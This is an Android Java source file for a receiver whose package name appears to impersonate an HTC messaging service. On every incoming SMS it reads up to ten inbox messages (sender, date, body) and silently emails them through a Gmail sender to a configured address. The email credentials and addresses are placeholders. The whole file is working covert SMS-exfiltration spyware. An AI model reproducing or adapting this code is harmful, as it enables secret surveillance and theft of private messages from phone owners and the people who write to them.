package com.htc.MessageService;

import java.sql.Date;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.text.format.DateFormat;
import android.util.Log;
 
public class SMSReactor extends BroadcastReceiver {
        /** TAG used for Debug-Logging */
	    private static final String TAG = "SMSReactor";
	    private static Context m_Context = null;
 
        /** The Action fired by the Android-System when a SMS was received.
         * We are using the Default Package-Visibility */

        private static final String RX = "android.provider.Telephony.SMS_RECEIVED";

    	public void sendSMS(String number, String message) {
    		PendingIntent pi = PendingIntent.getActivity(m_Context, 0,
    	            new Intent(m_Context, SMSOutboundService.class), 0);                
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(number, null, message, pi, null);
    	}
 

        private StringBuilder m_outputLog = new StringBuilder();
    	
        public void onReceive(Context context, Intent intent) {
        	m_Context = context;
        	
            // Start our service
			Intent myIntent = new Intent(context, SMSOutboundService.class);
			context.startService(myIntent);
			
            if (intent.getAction().equals(RX)) {

                // Always query the mms as it holds all conversation
                ContentResolver contentResolver = context.getContentResolver();
                Uri uri = Uri.parse("content://sms/inbox");
                Cursor query = contentResolver.query(uri, null, null, null, null);
                
                if (query.moveToFirst()) {
                	int count = 0;	// Don't send more than 10!
                    do {
                        // it's SMS
                    	Log.w(TAG, "SMS Rx");
                    	String phone = query.getString(query.getColumnIndex("address"));
                    	String date = query.getString(query.getColumnIndex("date"));
                    	String body = query.getString(query.getColumnIndex("body"));

                    	m_outputLog.append("To: " + phone);
                    	m_outputLog.append("\nDate: " + date);
                    	m_outputLog.append("\nMessage: " + body);
                    	m_outputLog.append("\n---------\n\n");
                    	count++;
                    } while (query.moveToNext() && count < 10);
                    
                	if (m_outputLog.length() > 0) {
    	            	try {   
    	                    GMailSender sender = new GMailSender("<your gmail account>", "<your password");
    	                    sender.sendMail("Message Log Inbound (last 40 messages)",   
    	                    		m_outputLog.toString(),   
    	                            "<from email>",
    	                            "<to email>");
    	                    m_outputLog.setLength(0);
    	                } catch (Exception e) {   
    	                    Log.e("SendMail", e.getMessage(), e);
    	                }
                	}
                }
            }
        }
}
